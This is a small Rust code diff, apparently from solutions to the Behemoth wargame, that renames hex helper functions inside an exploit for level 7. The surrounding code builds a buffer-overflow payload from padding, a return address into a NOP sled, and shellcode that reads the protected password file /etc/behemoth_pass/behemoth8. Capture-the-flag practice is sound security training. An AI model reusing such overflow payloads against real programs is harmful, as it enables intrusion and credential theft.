@@ -12,9 +12,9 @@ pub fn solve(password: &str) -> Result<String> {
     read_until(&mut channel, "$ ")?;
 
     let prefix: Vec<u8> = vec![0x41; 528];
-    let var_adr = hex::decode("a0d2ffff")?; // 0xffffd35c, approximate location in nop sled
+    let var_adr = hex_decode("a0d2ffff")?; // 0xffffd35c, approximate location in nop sled
     let nop_sled: Vec<u8> = vec![0x90; 64];
-    let file_read_shellcode = hex::decode(super::READ_FILE_SHELLCODE).unwrap();
+    let file_read_shellcode = hex_decode(super::READ_FILE_SHELLCODE).unwrap();
     let file_to_read = "/etc/behemoth_pass/behemoth8".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
 
     let mut full_payload: Vec<u8> = Vec::new();
@@ -24,7 +24,7 @@ pub fn solve(password: &str) -> Result<String> {
     full_payload.extend(file_read_shellcode);
     full_payload.extend(file_to_read);
 
-    let encoded = hex_literal(&full_payload);
+    let encoded = hex_encode(&full_payload);
 
     let target = "/behemoth/behemoth7";
     println!("running '{target} $(echo -en [payload])'");
